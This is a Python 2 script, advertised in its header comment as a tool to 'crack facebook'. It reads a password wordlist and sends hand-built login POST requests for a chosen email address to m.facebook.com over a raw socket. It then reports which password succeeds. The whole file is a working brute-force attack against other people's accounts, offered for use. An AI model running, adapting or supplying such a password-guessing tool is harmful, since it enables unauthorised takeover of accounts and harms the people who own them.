import socket
import sys
#Delay
import time
'''
hello ,
i hope my new tool for crack facebook is good :D
how to use :
 python markrack.py name@yahoo.com /root/file.txt

* Wirning be sure that the email address is true 

have fun for crack ;)

idea by Hesham Roperto
 www.facebook.com/hesham.Robert
programing by me 
 www.facebook.com/adeltttttt
'''

# colors for cool :D
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan

if len(sys.argv) > 2:
    a = sys.argv[1]
    b = sys.argv[2]
else:
    print G + 'Ussage : '+ W + sys.argv[0] + " 'email address' 'file.txt' "
    print G+ 'Ex : python '+ W + sys.argv[0] + ' name@yahoo.com /root/file.txt'
    exit()
# getting face page
connect='GET / HTTP/1.1\r\nHost: m.facebook.com\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:43.0) Gecko/20100101 Firefox/40.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\n\r\n'
# getting login page
connect1='GET /login.php HTTP/1.1\r\nHost: m.facebook.com\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:43.0) Gecko/20100101 Firefox/40.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\n\r\n'
# fake cookies accepting
conn_fav= 'GET /favicon.ico HTTP/2.0\r\nHost: m.facebook.com\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:43.0) Gecko/20100101 Firefox/40.0\r\nAccept: image/png,image/*;q=0.8,*/*;q=0.5\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\n\r\n'
try :
    a1 = open(b ,'r')
except IOError :
    print R + '[!] ' + W + 'No such file or directory: ' + sys.argv[2]
    print G + 'Ussage : '+ W + sys.argv[0] + " 'email address' 'file.txt' "
    print G+ 'Ex : python '+ W + sys.argv[0] + ' name@yahoo.com /root/file.txt'
    exit()

a2 = a1.readline()

while True :
   a2 = a2.replace('\n' ,'')
   print G +'[*] ' +'try: '+ W ,repr(a2) , W
   #sending pass
   post = 'POST /login/?email='+a+'&li=yCmKV2c54OQ5vYDSoPc0Q8a- HTTP/1.1\r\n'
   post += 'Host: m.facebook.com\r\n'
   post += 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:43.0) Gecko/20100101 Firefox/40.0\r\n'
   post += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
   post += 'Accept-Language: en-US,en;q=0.5\r\n'
   post += 'Referer: https://m.facebook.com/login.php\r\n'
   post += 'Connection: keep-alive\r\n'
   post += 'Content-Type: application/x-www-form-urlencoded\r\n'
   leng = 'lsd=AVoce-CH&charset_test=%E2%82%AC%2C%C2%B4%2C%E2%82%AC%2C%C2%B4%2C%E6%B0%B4%2C%D0%94%2C%D0%84&version=1&ajax=0&width=0&pxr=0&gps=0&dimensions=0&m_ts=1467321538&li=wox1VxYb0mks1M5dtXoX3vlH&email='+a+'&pass='+a2+'&login=Log+In'
   post += 'Content-Length: '+str(len(leng))+'\r\n\r\n'
   post += leng

   s = socket.socket()
   s.connect(('m.facebook.com', 80))
   s.send(connect)
   time.sleep(0.2)
   c = repr(s.recv(100000))
   s.send(connect1)
   time.sleep(0.2)
   c = repr(s.recv(100000))
   s.send(conn_fav)
   time.sleep(0.2)
   c = repr(s.recv(100000))
   s.send(post)
   time.sleep(0.2)
   c = repr(s.recv(100000))
   check = c[13:69]
   print 'Recv : ' ,len(c) , 'bit'
   print 'check.....'
   if check[55] == '=' :
      print R +'[!] '+ W + 'pass is Wrong!' 
   
   check = c[13:71]
    
   if check[57] == '=' :
      print G +'[*] '+ W + 'pass is Wright    :D'
      exit()
   s.close()
   a2 = a1.readline()
   if a2 == "" :
      print R + '[#] '+ W + 'List has finish Try another Worldlist in next '+ O +'1.5'+ W +' Hour'
      exit()
   time.sleep(4.4)

